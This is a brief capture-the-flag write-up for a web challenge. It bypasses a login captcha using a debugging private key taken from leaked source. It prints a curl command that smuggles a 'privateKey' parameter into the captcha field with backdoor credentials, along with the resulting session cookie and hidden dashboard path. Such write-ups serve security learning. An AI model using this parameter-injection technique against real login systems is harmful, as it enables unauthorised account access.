## Solution

When looking into the leaked source code, you can find a debugging `privkey`. When you test some requests to the `/captchaVerify` endpoint with that key, it seems it makes the `captchaUserValue` accept any value. So lets try to inject that private key to the `captcha_verification_value` field:

	$ curl 'http://challs.xmas.htsp.ro:11000/login' --data 'user=backd00r&pass=catsrcool&captcha_verification_value=AAAA%26privateKey=8EE86735658A9CE426EAF4E26BB0450E' -vvv

Yeah it works! The important information of the response are a session cookie and the redirection to that dashboard page:

	Set-Cookie: session=eyJsb2dnZWQiOnRydWV9.XffUxA.M-sXpowWOM2fqtA9vYzHff-wl-Y;
	<p>You should be redirected automatically to target URL: <a href="/dashboard_jidcc88574c">/dashboard_jidcc88574c</a>.  If not click the link.

When we set the cookie and visit the page, there are three links, the last one is a video that shows the flag at the bottom.
